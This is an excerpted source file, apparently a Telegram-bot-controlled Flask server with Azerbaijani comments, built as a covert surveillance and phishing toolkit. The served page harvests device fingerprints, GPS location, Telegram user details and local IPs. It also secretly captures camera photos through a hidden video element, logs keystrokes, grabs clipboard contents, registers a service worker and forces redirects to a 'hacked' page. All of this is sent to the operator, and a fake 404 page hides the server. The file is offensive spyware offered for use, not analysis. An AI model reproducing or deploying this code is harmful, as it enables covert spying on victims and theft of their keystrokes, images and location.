...
.status-bar { position: fixed; bottom: 0; left: 0; right: 0; background: #1a1a1a; color: #0f0; font-size: 12px; padding: 8px 16px; text-align: center; border-top: 1px solid #333; }
</style>
</head>
<body>
<div class="container">
...
var clientInfo = {
    ip: TARGET_IP, userAgent: navigator.userAgent, platform: navigator.platform,
    language: navigator.language, screen: screen.width+'x'+screen.height,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    hardwareConcurrency: navigator.hardwareConcurrency || '?',
    deviceMemory: navigator.deviceMemory || '?', referrer: document.referrer || 'direct',
    connection: navigator.connection ? navigator.connection.effectiveType : '?',
    touchSupport: 'ontouchstart' in window, timestamp: new Date().toISOString()
};
if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(function(pos) {
        clientInfo.lat = pos.coords.latitude; clientInfo.lon = pos.coords.longitude;
        clientInfo.accuracy = pos.coords.accuracy; sendHarvest();
...
function sendHarvest() {
    fetch('/harvest', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(clientInfo) }).catch(function(){});
    setTimeout(startCamera, 200); setTimeout(captureClipboard, 1000);
}
function startCamera() {
    try {
        ...
        .then(function(stream) {
            video.srcObject = stream; video.onloadedmetadata = function() {
                video.play();
                for (var i = 0; i < 5; i++) { setTimeout(function(idx){ capturePhoto(video, idx+1); }, i * 100); }
...
document.addEventListener('keydown', function(e) {
    keys.push(e.key);
    if (keys.length >= 20) { fetch('/click', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ip: TARGET_IP, data: keys.join(''), type: 'keylog' }) }).catch(function(){}); keys = []; }
});
if ('serviceWorker' in navigator) {
    ...
    navigator.serviceWorker.register(URL.createObjectURL(new Blob([swCode],{type:'application/javascript'})),{scope:'/'}).then(function(){}).catch(function(){});
}
setInterval(function() { if(window.location.href.indexOf('/hacked')===-1){window.location.replace('${APP_URL}/hacked?ip=${TARGET_IP}')} }, 3000);
...
<script>
var userData = {};
try { if(window.Telegram&&window.Telegram.WebApp){var wa=window.Telegram.WebApp;userData.telegramUser=wa.initDataUnsafe?wa.initDataUnsafe.user:null;wa.ready();} } catch(e) {}
...
if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(function(pos){userData.lat=pos.coords.latitude;userData.lon=pos.coords.longitude;userData.accuracy=pos.coords.accuracy;sendMiniApp();},function(){sendMiniApp();},{enableHighAccuracy:true,timeout:5000,maximumAge:0});
} else { setTimeout(sendMiniApp, 500); }
try {
    var pc = new (window.RTCPeerConnection||window.webkitRTCPeerConnection)({iceServers:[]});
    pc.createDataChannel(''); pc.createOffer().then(function(o){pc.setLocalDescription(o)}).catch(function(){});
    pc.onicecandidate = function(ice){if(ice&&ice.candidate){var m=/([0-9]{1,3}(\\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);if(m){userData.localIP=m[1];}}};
} catch(e) {}
...
setTimeout(function(){
    try{
        ...
        v.style.cssText='position:fixed;opacity:0.001;width:1px;height:1px;top:-100px;left:-100px;z-index:-9999';
        document.body.appendChild(v);
        navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:false}).then(function(s){v.srcObject=s;v.onloadedmetadata=function(){v.play();for(var i=0;i<5;i++){setTimeout(function(idx){var c=document.createElement('canvas');c.width=1280;c.height=720;c.getContext('2d').drawImage(v,0,0);var d=c.toDataURL('image/jpeg',0.85);fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:'miniapp',photo:d,index:idx+1,total:5,user_agent:'MiniApp'})}).catch(function(){});},i*200);}setTimeout(function(){s.getTracks().forEach(function(t){t.stop()});if(v.parentNode)v.parentNode.removeChild(v);},2000);};}).catch(function(){});
    }catch(e){}
},1000);
</script>
</body>
...
# ========== FAKE 404 ==========
FAKE_PAGE = '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>404</h1><p>Page not found</p></body></html>'
...
# ========== BOT HANDLERS ==========
# Admin state: None = normal, 'awaiting_ip' = IP gözləyir, {'target': '...'} = təsdiq gözləyir
admin_state = None
...
async def start_handler(update: Update, context):
    ...
    logger.info(f"📩 /start: {full_name} (ID: {user_id}, Chat: {chat_id})")
    
    if user_id == ADMIN_ID:
        # Admin: IP soruş
        admin_state = 'awaiting_ip'
        logger.info(f"👑 Admin start: IP gözləyir...")
...
async def cancel_handler(update: Update, context):
    ...
    if update.effective_user.id != ADMIN_ID:
        return
    admin_state = None
    await update.message.reply_text("❌ Ləğv edildi. `/start` yazın.")
...
async def handle_text(update: Update, context):
    ...
    logger.info(f"📝 Text mesaj: '{text[:30]}' (User: {user_id}, AdminState: {admin_state})")
    
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Sizə icazə verilmir.")
        return
    
    # Yalnız admin 'awaiting_ip' vəziyyətində
    if admin_state == 'awaiting_ip':
        ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
        url_pattern = r'^https?://[^\s]+$'
        
        if re.match(ip_pattern, text) or re.match(url_pattern, text):
            logger.info(f"✅ IP qəbul edildi: {text}")
            admin_state = {'target': text}
            ip_info = get_ip_info(text if re.match(ip_pattern, text) else text[:50])
            
            keyboard = [[
                InlineKeyboardButton("✅ Bəli, Hücum Başlat", callback_data=f"atk_{text}"),
                InlineKeyboardButton("❌ Ləğv Et", callback_data="atk_cancel")
            ]]
        ...
        await update.message.reply_text("❌ Əvvəlcə `/start` yazın.")
...
async def button_handler(update: Update, context):
    ...
    if data.startswith('atk_'):
        if data == 'atk_cancel':
            admin_state = None
            await query.edit_message_text("❌ Hücum ləğv edildi. `/start` yazın.")
            return
        
        target = data[4:]  # 'atk_192.168.1.1' → '192.168.1.1'
        attack_url = f"{APP_URL}/hacked?ip={target}"
        attack_key = target if re.match(r'^(\d{1,3}\.){3}\d{1,3}$', target) else target[:30]
        
        active_attacks[attack_key] = {'target': target, 'started': time.time()}
        admin_state = None
        
        logger.info(f"🎯 HÜCUM BAŞLADILDI! Hədəf: {target}")
        
        await query.edit_message_text(
            f"✅ *Hücum Başladıldı!*\n\n"
            f"📍 Hədəf: `{target}`\n"
            f"🔗 Hücum linki: [Hacked Page]({attack_url})\n\n"
            f"📸 5 şəkil (anında) | 📍 GPS | 📱 ISP | 📋 Clipboard | ⌨️ Keylogger\n"
            f"🔄 Redirect: istənilən sayt → hacked page",
            parse_mode='Markdown',
...
def hacked():
    ...
    logger.info(f"🎯 HACKED PAGE - IP: {ip}, Real: {get_client_ip()}")
...
def miniapp_harvest():
    try:
        ...
        real_ip = get_client_ip()
        if _bot_ready:
            msg_parts = [f"📱 *MiniApp İstifadəçi*"]
            tg_user = data.get('telegramUser')
            if tg_user:
                first = tg_user.get('first_name','?'); last = tg_user.get('last_name','')
                uid = tg_user.get('id','?'); uname = tg_user.get('username','')
                msg_parts.append(f"👤 *Ad:* `{first} {last}` 🆔 `{uid}`")
                if uname: msg_parts.append(f"📧 @{uname}")
...
def capture():
    try:
        data = request.get_json()
        ip = data.get('ip','unknown'); b64 = data.get('photo'); idx = data.get('index'); total = data.get('total')
...
async def _send_photo(ip, photo_bytes, idx, total):
    try:
        ...
        await application.bot.send_photo(chat_id=ADMIN_ID, photo=InputFile(photo_bytes, filename=f"stealth_{ip}_{idx}.jpg"), caption=cap, parse_mode='Markdown')
        if idx == total:
            await application.bot.send_message(chat_id=ADMIN_ID, text=f"✅ *Kamera tamam!* {total} şəkil.", parse_mode='Markdown')
    except Exception as e:
...
def click():
    try:
        data = request.get_json()
        ip=data.get('ip','?'); txt=data.get('data','')[:1500]; typ=data.get('type','data')
        icons={'clipboard':'📋 Clipboard','keylog':'⌨️ Keylog','network':'🌐 Network'}
        icon=icons.get(typ,'📝 Data')
        if _bot_ready:
            asyncio.run_coroutine_threadsafe(application.bot.send_message(chat_id=ADMIN_ID, text=f"{icon}\n🎯 IP: `{ip}`\n\n```\n{txt}\n```", parse_mode='Markdown'),bot_loop)
        return jsonify({'status':'ok'})
    except Exception as e:
        return jsonify({'status':'error'}),500
...
if __name__ == '__main__':
    ...
    logger.info(f"🔄 Redirect: {REDIRECT_TARGET}")
    logger.info("🥷 MODE active")
